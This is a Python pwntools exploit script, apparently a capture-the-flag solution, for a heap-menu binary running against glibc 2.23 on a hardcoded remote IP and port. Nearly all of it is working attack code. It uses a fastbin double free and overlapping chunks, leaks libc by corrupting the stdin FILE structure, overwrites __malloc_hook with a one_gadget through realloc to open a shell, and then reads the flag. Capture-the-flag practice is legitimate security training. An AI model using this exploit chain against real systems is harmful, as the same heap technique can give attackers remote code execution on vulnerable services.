#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    
    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    # os.system('gcc -g  -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so '.replace('{}', salt))
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './pwn'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('139.180.216.34', 8888)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')
# libc = ELF('/glibc/glibc-2.23/debug_x64/lib/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    define se
        set *(void **)($arg0 + 0x10)=$arg1
        end
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def create(size, index, content):
    sh.sendlineafter('choice >> \n', '1')
    sh.sendlineafter('wlecome input your size of weapon: ', str(size))
    sh.sendlineafter('input index: ', str(index))
    sh.sendafter('input your name:\n', content)

def delete(index):
    sh.sendlineafter('choice >> \n', '2')
    sh.sendlineafter('input idx :', str(index))

def rename(index, content):
    sh.sendlineafter('choice >> \n', '3')
    sh.sendlineafter('input idx: ', str(index))
    sh.sendafter('new content:\n', content)


create(0x60, 0, 'a' * 0x50 + p64(0) + p64(0x71))
create(0x60, 1, 'b' * 0x50 + p64(0) + p64(0x71))
create(0x60, 2, '\n')
create(0x60, 3, '\n')

delete(0)
delete(1)
delete(0)

create(0x60, 4, '\x60')
create(0x60, 5, '\n')
create(0x60, 6, '\n')

create(0x60, 7, p64(0) + p64(0xe1))
delete(1)

delete(0)
delete(2)
delete(0)

create(0x60, 4, '\xd0')
create(0x60, 5, '\n')
create(0x60, 6, '\n')
create(0x60, 7, p64(0) + p64(0x71))

delete(2)
create(0x28, 8, '\n')
create(0x38, 8, '\n')

rename(7, p64(0) + p64(0x71) + p16(0x25dd))

# pause()
context.log_level = 'debug'


create(0x60, 6, '\n')
create(0x60, 8, '\0' * 0x33 + p64(0x00000000fbad2887 + 0x1000) + p64(0) * 3 + '\x88')

result = sh.recvn(8)

libc_addr = u64(result) - libc.symbols['_IO_2_1_stdin_']
log.success('libc_addr: ' + hex(libc_addr))

main_arena_addr = libc_addr + (libc.symbols['__malloc_hook'] + 0x10)
log.success('main_arena_addr: ' + hex(main_arena_addr))

delete(6)
rename(7, p64(0) + p64(0x71) + p64(main_arena_addr - 0x33))
create(0x60, 0, '\n')

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''

# pause()
create(0x60, 0, 'z' * 0xb + p64(libc_addr + 0xf1147) + p64(libc_addr + libc.symbols['realloc'] + 2))

sh.sendlineafter('choice >> \n', '1')
sh.sendlineafter('wlecome input your size of weapon: ', str(1))
sh.sendlineafter('input index: ', str(1))

sh.sendline('cat flag')
sh.interactive()
clear()
